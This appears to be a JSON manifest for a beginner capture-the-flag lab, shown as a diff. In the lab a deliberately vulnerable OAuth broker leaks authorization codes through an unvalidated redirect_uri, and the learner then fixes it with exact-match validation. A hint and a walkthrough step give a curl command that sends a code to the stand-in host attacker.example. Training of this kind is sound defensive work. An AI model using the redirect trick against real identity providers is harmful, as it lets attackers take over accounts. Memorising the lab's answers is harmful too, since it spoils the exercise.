@@ -1,0 +1,146 @@
+{
+  "schemaVersion": 1,
+  "id": "open-redirect-oauth",
+  "version": "1.0.0",
+  "status": "published",
+  "title": "Code to Nowhere",
+  "subtitle": "Leak an authorization code through Kestrel's open redirect",
+  "category": "Identity & Access",
+  "difficulty": "Beginner",
+  "estimatedMinutes": 18,
+  "skills": [
+    "OAuth 2.0",
+    "Redirect URI validation",
+    "Authorization codes"
+  ],
+  "summary": "Kestrel's OAuth broker accepts any redirect_uri. Send a code to an attacker-controlled host, capture the marker, then enforce the registered callback.",
+  "scenario": "Kestrel Identity brokers logins for its own web client. The authorize endpoint never compares redirect_uri with the registered value. Demonstrate the leak and close it without breaking the real client.",
+  "prerequisites": [
+    "Understanding of OAuth redirect flows",
+    "curl"
+  ],
+  "learningObjectives": [
+    "Explain why redirect_uri must be matched exactly",
+    "Capture a code delivered to an unregistered host",
+    "Enforce exact-match redirect validation"
+  ],
+  "authorizedScope": "Only the Kestrel training broker. No real identity provider is involved.",
+  "riskSummary": "An unvalidated redirect_uri lets attackers receive authorization codes, which they exchange for tokens and account access.",
+  "remediation": "Compare the full redirect URI byte-for-byte against client registration, reject look-alike prefixes, and bind codes to client_id plus PKCE.",
+  "conclusion": "You redirected an authorization code to an unregistered host and then restricted the broker to the registered callback.",
+  "baseXp": 100,
+  "workspace": {
+    "image": "cipherforge/workspace:1.2.0",
+    "tools": [
+      "curl",
+      "jq",
+      "python3",
+      "labctl"
+    ]
+  },
+  "services": [
+    {
+      "name": "app",
+      "role": "target",
+      "app": "open-redirect-oauth/app/server.mjs",
+      "ports": [
+        {
+          "port": 8080,
+          "protocol": "http",
+          "published": true,
+          "name": "web"
+        }
+      ],
+      "health": {
+        "kind": "http",
+        "path": "/api/health",
+        "expectStatus": 200,
+        "expectBody": "kestrel-oauth",
+        "timeoutSeconds": 30
+      },
+      "flagObjectives": [
+        "oauth-flag"
+      ]
+    }
+  ],
+  "resources": {
+    "cpus": 0.5,
+    "memoryMb": 320,
+    "pids": 96,
+    "writableDiskMb": 64,
+    "maxMinutes": 45,
+    "idleTimeoutMinutes": 20
+  },
+  "network": {
+    "outbound": "deny",
+    "internalPorts": [
+      8080
+    ]
+  },
+  "objectives": [
+    {
+      "id": "oauth-flag",
+      "title": "Steal a code",
+      "description": "Call /oauth/authorize with an attacker-controlled redirect_uri and submit the marker embedded in the issued code.",
+      "validation": {
+        "type": "flag",
+        "objectiveKind": "flag",
+        "xp": 45
+      },
+      "hints": [
+        {
+          "id": "h1",
+          "text": "Use `curl -si` and read the Location header: `?redirect_uri=https://attacker.example/collect`.",
+          "xpPenalty": 5
+        }
+      ]
+    },
+    {
+      "id": "redirect-check",
+      "title": "Enforce the registered callback",
+      "description": "Turn on redirect validation. The live check confirms unregistered hosts (including prefix look-alikes) are rejected while the registered callback still receives a code.",
+      "validation": {
+        "type": "check",
+        "objectiveKind": "check",
+        "xp": 55,
+        "validator": "redirect-validated",
+        "criteria": [
+          "unregistered host rejected",
+          "prefix bypass rejected",
+          "registered callback still gets a code"
+        ]
+      },
+      "hints": [
+        {
+          "id": "h1",
+          "text": "Apply `{\"validateRedirect\": true}` with `labctl policy apply -`.",
+          "xpPenalty": 5
+        }
+      ]
+    }
+  ],
+  "validators": [
+    "redirect-validated"
+  ],
+  "provisioner": {
+    "script": "open-redirect-oauth/provision.mjs",
+    "timeoutSeconds": 45
+  },
+  "walkthrough": [
+    {
+      "title": "Inspect the client",
+      "body": "The landing page shows the registered callback.",
+      "snippet": "curl -s $CF_TARGET_URL/ | grep -i callback"
+    },
+    {
+      "title": "Redirect the code",
+      "body": "Send the code to an unregistered host.",
+      "snippet": "curl -si \"$CF_TARGET_URL/oauth/authorize?client_id=kestrel-web&redirect_uri=https%3A%2F%2Fattacker.example%2Fcollect\" | grep -i location"
+    },
+    {
+      "title": "Lock the redirect",
+      "body": "Enforce exact matching.",
+      "snippet": "echo '{\"validateRedirect\": true}' | labctl policy apply -"
+    }
+  ]
+}
